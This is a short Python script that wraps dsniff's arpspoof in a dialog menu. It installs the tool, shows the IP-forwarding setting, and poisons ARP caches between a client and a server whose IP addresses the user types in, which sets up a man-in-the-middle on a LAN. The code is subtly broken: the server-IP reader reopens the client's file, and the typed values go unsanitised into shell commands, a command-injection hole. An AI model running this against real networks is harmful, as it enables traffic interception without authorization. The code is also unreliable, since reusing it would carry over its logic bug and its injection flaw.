#!/usr/bin/python/

import os,time

os.system("reset")
d='dialog'
loc='python  '
def fun1():
	f1=open('/tmp/ch1.txt','r')
	ch1=f1.read()
	f1.close()
	return ch1
def fun2():
	f2=open('/tmp/ch1.txt','r')
	ch2=f2.read()
	f2.close()
	return ch2
def exit():
	time.sleep(4)
	os.system(""+loc+" main.py")
def arp():
	os.system(""+d+"  --menu  '----****[ARP Spoofing]****----' 15  46  4 	1 'Install ARP SPOOFING' 											2 'UPDATE the Feature of IP FORWARDING' 										3 'USE arp-spoofing' 											4 'EXIT to MAIN-MENU' 2>/tmp/ch7.txt")
	f=open('/tmp/ch7.txt','r')
	ch=f.read()
	f.close()
	if   ch =='1':
		os.system("yum install dsniff -y ")
		exit()
	elif ch=='2' :
		os.system("cat /proc/sys/net/ipv4/ip_forward")
		exit()		
	elif ch =='3' :
		os.system(""+d+"  --inputbox 'Enter IP address of Client:' 10  30  2>/tmp/ch1.txt")
		ch1=fun1()
		os.system(""+d+"  --inputbox 'Enter IP address of Server:' 10  30  2>/tmp/ch2.txt")
		ch2=fun2()
		os.system(""+d+"  --infobox  'Press Ctrl+c to stop receiving' 10 30 ")
		os.system(""+d+"  --inputbox 'Enter the LAN Card name:' 10  30  2>/tmp/ch3.txt")
		f3=open('/tmp/ch3.txt','r')
		ch3=f3.read()
		f3.close()
		os.system("arpspoof  -i "+ch3+" -t "+ch1+ "  "+ch2)
		os.system("arpspoof  -i "+ch3+" -t "+ch2+ "  "+ch1)
		exit()
	elif ch =='4' :
		os.system(""+loc+"main.py")
	else:
		os.system(""+d+"  --infobox  'Choose option 4 for EXIT' 5 30")
		time.sleep(2)
		os.system(""+loc+"4.py")

arp()
